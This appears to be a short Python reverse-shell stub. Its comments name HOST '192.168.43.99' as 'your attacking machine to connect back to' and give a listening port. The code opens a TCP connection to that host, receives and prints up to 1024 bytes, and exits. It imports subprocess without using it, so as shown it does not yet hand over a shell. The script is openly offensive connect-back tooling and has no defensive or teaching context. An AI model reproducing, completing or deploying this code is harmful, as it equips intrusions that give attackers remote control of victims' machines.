import socket
import subprocess
import sys
import time

HOST = '192.168.43.99'    # Your attacking machine to connect back to
PORT = 1234     # The port your attacking machine is listening on

def connect(host, port):
   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   go.connect((host, port))
   data = go.recv(1024)
   print(data)

   sys.exit()
   return


connect(HOST, PORT)
